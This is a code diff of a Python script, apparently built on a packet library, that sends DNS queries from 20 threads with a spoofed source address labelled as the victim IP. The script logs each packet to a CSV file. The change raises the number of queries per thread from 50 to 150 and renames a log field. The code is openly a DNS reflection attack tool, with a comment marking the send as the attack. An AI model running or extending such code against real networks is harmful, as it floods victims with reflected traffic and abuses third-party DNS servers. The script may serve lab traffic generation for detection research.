@@ -17,7 +17,7 @@ import sys
 # Number of threads to use
 NUM_THREADS = 20
 # Number of DNS queries to send per thread
-NUM_QUERIES = 50
+NUM_QUERIES = 150
 # The source IP address to use
 SRC_IP = "40.40.10.10"
 # The DNS server to send the queries to
@@ -74,7 +74,7 @@ def send_custom_dns_query(src_ip, dns_server, domain):
         # Send query to attack
         send(dns_request, verbose=0)
         BYTE_COUNTER.add(len(dns_request))
-        QUEUE.put({'time': time.time(), 'query_size': len(dns_request), 'victim_ip': src_ip, 'dns_server': dns_server, 'query_domain': domain, 'query_type': QUERY_TYPE})
+        QUEUE.put({'time': time.time(), 'packet_size': len(dns_request), 'victim_ip': src_ip, 'dns_server': dns_server, 'query_domain': domain, 'query_type': QUERY_TYPE})
         time.sleep(0.2)
 
     
@@ -110,8 +110,8 @@ if __name__ == "__main__":
     with open(DNS_QUERIES_FILE, "a") as f:
         # write the header if the file is empty
         if os.stat(DNS_QUERIES_FILE).st_size == 0:
-            f.write("time,query_size,victim_ip,dns_server,query_domain,query_type\n")
+            f.write("time,packet_size,victim_ip,dns_server,query_domain,query_type\n")
         while not QUEUE.empty():
             query = QUEUE.get()
-            f.write(f"{query['time']},{query['query_size']},{query['victim_ip']},{query['dns_server']},{query['query_domain']},{query['query_type']}\n")
+            f.write(f"{query['time']},{query['packet_size']},{query['victim_ip']},{query['dns_server']},{query['query_domain']},{query['query_type']}\n")
         print(f"DNS queries log saved to {DNS_QUERIES_FILE}")
